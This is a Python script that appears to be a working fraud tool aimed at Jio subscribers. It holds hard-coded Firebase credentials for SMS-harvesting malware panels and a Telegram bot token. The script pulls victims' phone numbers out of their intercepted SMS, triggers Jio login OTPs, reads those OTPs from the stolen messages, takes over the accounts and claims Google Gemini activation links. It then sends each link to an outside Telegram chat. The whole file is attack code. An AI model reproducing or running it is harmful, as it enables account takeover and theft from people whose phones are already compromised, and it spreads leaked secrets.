"""
Jio Gemini Activation Scanner - COMPLETE EDITION
All panels decoded from Netlify URLs
Flow: All Panels → Online Devices → Unique Numbers → Process Links
"""

from __future__ import annotations
import csv
import html
import re
import time
import base64
from collections import Counter, defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from zoneinfo import ZoneInfo

import requests

# ==================== ALL PANELS (DECODED FROM NETLIFY URLS) ====================
# These were extracted from the Netlify panel URLs you provided
# Format: (firebase_url, auth_key)

FIREBASE_PANELS = [
    ("https://apkdriod-f6fb9-default-rtdb.firebaseio.com", "AIzaSyBVDnh3vYAH9lnPnrrYGf1Vk7Rg030UE2A"),
    ("https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyBXJdXWfTCC4tSqD0nYXUbXaSISKhtjnrc"),
    ("https://siwanikumar923420-2e01f-default-rtdb.firebaseio.com", "AIzaSyBUKtg-eoK5b5rt8tpLaQbiSSS-z0H8woM"),
    ("https://m90910540-a4e00-default-rtdb.firebaseio.com", "AIzaSyC_7pBBqu9LYTi4BcXo_q7VUviWoL91V6c"),
    ("https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyC0D_8y2VQ5rYqfPyr-anr67ewq1MskDZg"),
    ("https://dhheee-b95dc-default-rtdb.firebaseio.com", "AIzaSyATn6LDSqEYPCyY-yMKDhzVBO263WmYOqY"),
    ("https://pmnr1newad-default-rtdb.firebaseio.com", "AIzaSyDyeSMnF_Sb9oaPoUjvW4ERov6Lq7h9CNM"),
    ("https://master89812-b77a6-default-rtdb.firebaseio.com", "AIzaSyD8dtVPCyRtNPCJ8m3I7qmuiJy1ZYNCOgs"),
    ("https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com", "AIzaSyD8dtVPCyRtNPCJ8m3I7qmuiJy1ZYNCOgs"),
    ("https://m05960864-6140e-default-rtdb.firebaseio.com", "AIzaSyBUKtg-eoK5b5rt8tpLaQbiSSS-z0H8woM"),
    ("https://godpanel-203f8-default-rtdb.asia-southeast1.firebasedatabase.app", "AIzaSyCs3AJDbOaOpNTmImjgF-n32I-AK7CYWMk"),
    ("https://pm-kisan-22hg-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
    ("https://pm-kishan-25-58b3c-default-rtdb.firebaseio.com", "AIzaSyA51lq8IG509h32yHtzaWWWzdyZNqemUkc"),
    ("https://testingyou-2dcac-default-rtdb.firebaseio.com", ""),
    ("https://pm-kisan-15jg-default-rtdb.firebaseio.com", "AIzaSyCbT2cHC05tINJ3aOku1URGlAzWTG1IS1E"),
]

MESSAGE_SCAN_LIMIT = 100
OTP_TIMEOUT = 20
POLL_INTERVAL = 1

LINKS_FILE = Path("gemini_activation_links.txt")
RESULTS_FILE = Path("gemini_results.csv")

# ==================== TELEGRAM NOTIFICATION ====================
import os

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8706782960:AAFFxuOs0HoNyVpaPI56Qj42C6e4nUOEPpY")
TELEGRAM_CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "8403291265")
# Cara isi langsung (jika tidak pakai env var):
# TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHI..."
# TELEGRAM_CHAT_ID   = "123456789"

def send_telegram(message: str) -> bool:
    """Kirim pesan ke Telegram. Return True jika berhasil."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        r = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }, timeout=10)
        return r.status_code == 200
    except Exception:
        return False

CHECK_NUMBER_URL = "https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{mobile}"
SEND_OTP_URL = "https://www.jio.com/api/jio-login-service/login/sendOtp"
VERIFY_OTP_URL = "https://www.jio.com/api/jio-login-service/login/validateOtp"
AUTH_URL = "https://www.jio.com/api/jio-authenticate-service/authenticate/authJsonData"
NAVIGATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/navigate/Z0241"
ACTIVATE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
GOOGLE_URL = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
SUBMIT_URL = "https://www.jio.com/api/jio-ott-service/ott/submission/submit"
GOOGLE_PAGE = "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO"

NUMBER_PATTERNS = (
    re.compile(r"(?i)\bjio\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\brecharge(?:\s+now)?\s+jio\s+no[.]?\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    # Add Airtel patterns too since these panels have both
    re.compile(r"(?i)\bairtel\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
    re.compile(r"(?i)\bphone\s*(?:number|no[.]?)\s*[:=-]?\s*(?:[+]91)?([6-9]\d{9})"),
)

OTP_WORD_PATTERN = re.compile(r"(?i)\botp\b|one[ -]?time password|verification|code")
OTP_PATTERN = re.compile(r"(?<!\d)(\d{6})(?!\d)")

ACTIVATION_PATTERN = re.compile(
    r"https?://serviceactivation[.]google[.]com/subscription/new/"
    r"(?P<token>[A-Za-z0-9_-]{50,})(?P<padding>={0,2})",
    re.IGNORECASE,
)

RESULT_FIELDS = (
    "serial_number",
    "device_id",
    "mobile_number",
    "status",
    "activation_url",
    "nepal_date",
    "nepal_time",
)

# ==================== FUNCTIONS ====================

def firebase_get(session: requests.Session, base_url: str, key: str, path: str, params: dict[str, Any] | None = None) -> Any:
    query = {"auth": key}
    if params:
        query.update(params)
    # Handle case where key might be a URL (public access)
    if key and key.startswith("http"):
        # If key is actually a URL, don't use auth param
        response = session.get(f"{base_url}/{path.strip('/')}.json", timeout=20)
        response.raise_for_status()
        return response.json()
    response = session.get(f"{base_url}/{path.strip('/')}.json", params=query, timeout=20)
    response.raise_for_status()
    return response.json()

def latest_messages(session: requests.Session, base_url: str, key: str, device_id: str, limit: int) -> dict[str, dict[str, Any]]:
    # First try with orderBy, fallback to raw fetch if panel doesn't support it
    try:
        data = firebase_get(session, base_url, key, f"messages/{device_id}", {"orderBy": '"$key"', "limitToLast": max(1, limit)})
    except requests.RequestException:
        data = None
    if not isinstance(data, dict) or "error" in data:
        # Fallback: fetch all messages without ordering
        data = firebase_get(session, base_url, key, f"messages/{device_id}")
    if not isinstance(data, dict):
        return {}
    return {name: value for name, value in data.items() if isinstance(value, dict)}

def normalize_mobile(value: Any) -> str | None:
    digits = re.sub(r"\D", "", str(value or ""))
    if len(digits) > 10 and digits.startswith("91"):
        digits = digits[-10:]
    return digits if re.fullmatch(r"[6-9]\d{9}", digits) else None

# Jio sender IDs pattern
JIO_SENDER_RE = re.compile(
    r"(?i)^[A-Z]{2}-(JIO|MYJIO|JIOINF|JIONET|JIOMRT|JIOPBS|JioPay|JioSvc|JIOMOB)", 
)

# Generic: any 10-digit Indian mobile number in text
GENERIC_MOBILE_RE = re.compile(r"(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)")

def number_candidates(messages: dict[str, dict[str, Any]], client_data: dict[str, Any] | None = None) -> set[str]:
    found: set[str] = set()
    
    # Extract from client data (webhookEvent, etc.)
    if isinstance(client_data, dict):
        # webhookEvent.sendSms.to
        webhook = client_data.get("webhookEvent")
        if isinstance(webhook, dict):
            sms = webhook.get("sendSms")
            if isinstance(sms, dict):
                mobile = normalize_mobile(sms.get("to"))
                if mobile:
                    found.add(mobile)
    
    for item in messages.values():
        # simInfo
        sim_info = item.get("simInfo")
        if isinstance(sim_info, dict):
            mobile = normalize_mobile(sim_info.get("phoneNumber"))
            if mobile:
                found.add(mobile)
        # direct phoneNumber field
        mobile = normalize_mobile(item.get("phoneNumber"))
        if mobile:
            found.add(mobile)
        
        body = str(item.get("message", ""))
        sender = str(item.get("sender", ""))
        
        # Named patterns (Jio Number: X, Recharge Jio no X, etc.)
        for pattern in NUMBER_PATTERNS:
            found.update(pattern.findall(body))
        
        # If sender is Jio, extract ANY 10-digit mobile from body
        if JIO_SENDER_RE.match(sender):
            for m in GENERIC_MOBILE_RE.findall(body):
                found.add(m)
    
    return found

def firebase_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Cache-Control": "no-cache"})
    return session

def jio_session() -> requests.Session:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/login/",
    })
    return session

def response_json(response: requests.Response) -> dict[str, Any]:
    try:
        data = response.json()
    except ValueError:
        return {}
    return data if isinstance(data, dict) else {}

def response_error(response: requests.Response) -> bool:
    if not response.ok:
        return True
    data = response_json(response)
    if data.get("errorMessage") or data.get("error"):
        return True
    return str(data.get("status", "")).lower() in {"failed", "failure", "error", "false"}

def is_jio_number(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.get(CHECK_NUMBER_URL.format(mobile=mobile), timeout=20)
    except requests.RequestException:
        return False
    data = response_json(response)
    return not response_error(response) and bool(data.get("primaryService"))

def send_otp(session: requests.Session, mobile: str) -> bool:
    try:
        response = session.post(
            SEND_OTP_URL,
            json={"mobileNumber": mobile, "loginFlowType": "MOBILE", "alternateNumber": ""},
            timeout=20,
        )
    except requests.RequestException:
        return False
    return not response_error(response)

def verify_otp(session: requests.Session, mobile: str, otp: str) -> bool:
    try:
        response = session.post(VERIFY_OTP_URL, json={"mobileNumber": mobile, "otp": otp}, timeout=20)
    except requests.RequestException:
        return False
    return not response_error(response)

def message_order(key: str, item: dict[str, Any]) -> int:
    for value in (item.get("id"), item.get("timestamp"), key):
        try:
            return int(value)
        except (TypeError, ValueError):
            continue
    return 0

def wait_for_otp(firebase: requests.Session, base_url: str, key: str, device_id: str, known_keys: set[str], jio: requests.Session, mobile: str) -> bool:
    used: set[str] = set()
    deadline = time.monotonic() + OTP_TIMEOUT
    while time.monotonic() < deadline:
        try:
            messages = latest_messages(firebase, base_url, key, device_id, 20)
        except requests.RequestException:
            time.sleep(POLL_INTERVAL)
            continue
        candidates: list[tuple[int, str, str]] = []
        for message_key, item in messages.items():
            if message_key in known_keys or message_key in used:
                continue
            body = str(item.get("message", ""))
            if not OTP_WORD_PATTERN.search(body):
                continue
            match = OTP_PATTERN.search(body)
            if match:
                candidates.append((message_order(message_key, item), message_key, match.group(1)))
        if candidates:
            _, message_key, otp = max(candidates)
            used.add(message_key)
            if verify_otp(jio, mobile, otp):
                return True
        time.sleep(POLL_INTERVAL)
    return False

def activation_url(value: str) -> str:
    text = html.unescape(value or "")
    for _ in range(4):
        decoded = unquote(text)
        if decoded == text:
            break
        text = decoded
    match = ACTIVATION_PATTERN.search(text)
    if not match:
        return ""
    return "https://serviceactivation.google.com/subscription/new/" + match.group("token") + match.group("padding")

def already_active(value: str) -> bool:
    normalized = " ".join((value or "").lower().replace("_", " ").split())
    return any(phrase in normalized for phrase in (
        "already active", "already activated", "already redeemed",
        "already claimed", "already availed"
    ))

def api_message(data: dict[str, Any]) -> str:
    for name in ("errorMessage", "responseMessage", "responseMsg", "message"):
        if data.get(name):
            return str(data[name])
    return ""

def get_activation(session: requests.Session) -> tuple[str, str]:
    dashboard_headers = {"Accept": "*/*", "Referer": "https://www.jio.com/selfcare/dashboard/"}
    offer_headers = {"Accept": "*/*", "Referer": GOOGLE_PAGE}
    try:
        auth_response = session.get(AUTH_URL, headers=dashboard_headers, timeout=20)
        auth_data = response_json(auth_response)
        if not auth_response.ok or str(auth_data.get("loginFlag", "")).lower() != "true":
            return "api_session_invalid", ""
        session.get(NAVIGATE_URL, headers=dashboard_headers, timeout=20)
        activate_response = session.get(ACTIVATE_URL, headers=offer_headers, timeout=20)
        activate_data = response_json(activate_response)
        if already_active(api_message(activate_data)):
            return "already_active", ""
        if not activate_response.ok or str(activate_data.get("errorCode", "200")) != "200":
            return "activation_api_failed", ""
        google_response = session.get(GOOGLE_URL, headers=offer_headers, timeout=20)
        google_data = response_json(google_response)
        if already_active(api_message(google_data)):
            return "already_active", ""
        url = activation_url(str(google_data.get("redirectionURL", "")))
        if not url:
            return "no_activation_url", ""
        try:
            session.get(SUBMIT_URL, headers=offer_headers, timeout=20)
        except requests.RequestException:
            pass
        return "activation_url_found", url
    except requests.RequestException:
        return "activation_api_failed", ""

def save_link(url: str) -> None:
    if not url:
        return
    existing = set(LINKS_FILE.read_text(encoding="utf-8").splitlines()) if LINKS_FILE.exists() else set()
    if url in existing:
        return
    with LINKS_FILE.open("a", encoding="utf-8") as handle:
        handle.write(url + "\n")

def save_result(serial: int, device_id: str, mobile: str, status: str, url: str) -> None:
    now = datetime.now(ZoneInfo("Asia/Kathmandu"))
    exists = RESULTS_FILE.exists() and RESULTS_FILE.stat().st_size > 0
    with RESULTS_FILE.open("a", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=RESULT_FIELDS)
        if not exists:
            writer.writeheader()
        writer.writerow({
            "serial_number": serial,
            "device_id": device_id,
            "mobile_number": mobile,
            "status": status,
            "activation_url": url,
            "nepal_date": now.strftime("%Y-%m-%d"),
            "nepal_time": now.strftime("%I:%M:%S %p"),
        })

# ==================== MAIN ====================

def main() -> int:
    print("=" * 70)
    print("STEP 1: Checking ALL panels and collecting online devices...")
    print("=" * 70)
    print(f"Total Panels Loaded: {len(FIREBASE_PANELS)}")
    
    all_online_devices: dict[str, dict[str, Any]] = {}
    device_messages: dict[str, dict[str, dict[str, Any]]] = {}
    
    # Scan all panels
    for panel_idx, (base_url, firebase_key) in enumerate(FIREBASE_PANELS, start=1):
        print(f"\nPanel {panel_idx}/{len(FIREBASE_PANELS)}: {base_url}")
        firebase = firebase_session()
        try:
            # Try to get clients
            try:
                if firebase_key and firebase_key.startswith("http"):
                    response = firebase.get(f"{base_url}/clients.json", timeout=10)
                else:
                    response = firebase.get(f"{base_url}/clients.json?auth={firebase_key}", timeout=10)
                
                if response.status_code == 200:
                    clients = response.json()
                    if isinstance(clients, dict):
                        online_count = 0
                        for device_id, data in clients.items():
                            if isinstance(data, dict):
                                all_online_devices[device_id] = {
                                    "base_url": base_url,
                                    "firebase_key": firebase_key,
                                    "firebase_session": firebase,
                                    "data": data,
                                }
                                online_count += 1
                        # Also discover device IDs from /messages not in /clients
                        try:
                            if firebase_key and firebase_key.startswith("http"):
                                msg_resp = firebase.get(f"{base_url}/messages.json", params={"shallow": "true"}, timeout=10)
                            else:
                                msg_resp = firebase.get(f"{base_url}/messages.json", params={"auth": firebase_key, "shallow": "true"}, timeout=10)
                            if msg_resp.status_code == 200 and isinstance(msg_resp.json(), dict):
                                for msg_dev_id in msg_resp.json():
                                    if msg_dev_id not in all_online_devices:
                                        all_online_devices[msg_dev_id] = {
                                            "base_url": base_url,
                                            "firebase_key": firebase_key,
                                            "firebase_session": firebase,
                                            "data": {"status": False},
                                        }
                                        online_count += 1
                        except Exception:
                            pass
                        print(f" -> Devices: {online_count}")
                    else:
                        print(" -> No clients found")
                else:
                    print(f" -> HTTP {response.status_code}")
            except Exception as e:
                print(f" -> Error: {e}")
        except Exception as e:
            print(f" -> Error: {e}")
    
    print(f"\nTotal Devices Found: {len(all_online_devices)}")
    if not all_online_devices:
        print("Koi device nahi mila.")
        return 1
    
    # Extract numbers
    mappings: dict[str, set[str]] = defaultdict(set)
    for i, (device_id, info) in enumerate(all_online_devices.items(), start=1):
        try:
            messages = latest_messages(
                info["firebase_session"],
                info["base_url"],
                info["firebase_key"],
                device_id,
                MESSAGE_SCAN_LIMIT,
            )
            device_messages[device_id] = messages
            for mobile in number_candidates(messages, client_data=info.get("data")):
                mappings[mobile].add(device_id)
        except Exception as e:
            device_messages[device_id] = {}
        if i % 15 == 0 or i == len(all_online_devices):
            print(f"Scanned: {i}/{len(all_online_devices)}")
    
    targets: list[tuple[str, str]] = []
    for mobile, devices in sorted(mappings.items()):
        if devices:
            targets.append((sorted(devices)[0], mobile))
    
    print(f"\nTotal Unique Number Candidates: {len(targets)}")
    if not targets:
        print("Koi number nahi mila.")
        return 1
    
    print("\n" + "=" * 70)
    print("STEP 3: Starting OTP + Activation on all unique numbers...")
    print("=" * 70)
    statuses: Counter[str] = Counter()
    for serial, (device_id, mobile) in enumerate(targets, start=1):
        info = all_online_devices.get(device_id)
        if not info:
            continue
        print(f"\n[{serial}/{len(targets)}] Device: {device_id[:20]}... | ending: {mobile[-4:]}")
        base_url = info["base_url"]
        firebase_key = info["firebase_key"]
        firebase = info["firebase_session"]
        device = info["data"]
        jio = jio_session()
        known_keys = set(device_messages.get(device_id, {}))
        if not send_otp(jio, mobile):
            status, url = "otp_send_failed", ""
        elif not wait_for_otp(firebase, base_url, firebase_key, device_id, known_keys, jio, mobile):
            status, url = "otp_failed", ""
        else:
            status, url = get_activation(jio)
        statuses[status] += 1
        save_link(url)
        save_result(serial, device_id, mobile, status, url)
        print(f"Status: {status}")
        if url:
            print(f"LINK → {url}")
            msg = (
                f"🎉 <b>LINK GEMINI BARU DITEMUKAN!</b>\n\n"
                f"📱 <b>Nomor:</b> ending {mobile[-4:]}\n"
                f"🔗 <b>Link Aktivasi:</b>\n<code>{url}</code>\n\n"
                f"⚠️ <i>Segera buka dan claim sebelum expired!</i>"
            )
            if send_telegram(msg):
                print(" -> Notifikasi Telegram berhasil dikirim ke bot!")
            else:
                print(" -> Gagal kirim Telegram (pastikan chat ID sudah terisi).")
    
    print("\n" + "=" * 70)
    print("FINAL SUMMARY")
    print("=" * 70)
    print(f"Total Online Devices : {len(all_online_devices)}")
    print(f"Unique Numbers : {len(targets)}")
    for status, count in sorted(statuses.items()):
        print(f"{status:25}: {count}")
    print(f"\nLinks file : {LINKS_FILE.resolve()}")
    print(f"Results file : {RESULTS_FILE.resolve()}")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())